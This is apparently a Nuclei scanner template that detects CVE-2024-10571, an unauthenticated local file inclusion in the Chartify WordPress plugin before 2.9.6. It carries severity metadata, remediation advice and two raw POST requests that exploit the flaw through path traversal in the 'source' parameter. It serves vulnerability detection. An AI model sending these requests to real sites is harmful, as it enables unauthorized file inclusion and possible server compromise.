flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: header
    type: word
    words:
    - PHPSESSID
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/admin/partials/features/chart-builder-plugin-featured-display&type=chart-js
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=ays_chart_admin_ajax&function=display_plugin_charts_page&

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "ays-chart-heading-box", "View Documentation")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=add&source=../../../../../../../../../../wp-content/plugins/chart-builder/uninstall&type=chart-js
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=ays_chart_admin_ajax&function=display_plugin_charts_page

    '
id: CVE-2024-10571
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:ays-pro:chartify:*:*:*:*:free:wordpress:*:*
    cve-id: CVE-2024-10571
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-98,NVD-CWE-Other
    epss-percentile: 0.99113
    epss-score: 0.81081
  description: "The Chartify \u2013 WordPress Chart Plugin plugin for WordPress is\
    \ vulnerable to Local File Inclusion in all versions up to, and including, 2.9.5\
    \ via the 'source' parameter. This makes it possible for unauthenticated attackers\
    \ to include and execute arbitrary files on the server, allowing the execution\
    \ of any PHP code in those files. This can be used to bypass access controls,\
    \ obtain sensitive data, or achieve code execution in cases where images and other\
    \ \u201Csafe\u201D file types can be uploaded and included.\n"
  impact: 'Unauthenticated attackers can include and execute arbitrary PHP files via
    the source parameter, potentially achieving complete server compromise.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: chartify
    publicwww-query: /wp-content/plugins/chart-builder/
    vendor: ays-pro
    verified: true
  name: "Chartify \u2013 WordPress Chart Plugin < 2.9.6 - Local File Inclusion"
  reference:
  - https://plugins.trac.wordpress.org/browser/chart-builder/tags/2.9.6/admin/partials/charts/actions/chart-builder-charts-actions-options.php?rev=3184238
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/d4837258-c749-4194-926c-22b67e20c1fc?source=cve
  - https://github.com/RandomRobbieBF/CVE-2024-10571
  - https://nvd.nist.gov/vuln/detail/CVE-2024-10571
  remediation: 'Update Chartify plugin to version 2.9.6 or later.

    '
  severity: critical
  tags: cve,cve2024,wp,wp-plugin,wordpress,chartify,chart-builder,lfi,vkev,vuln
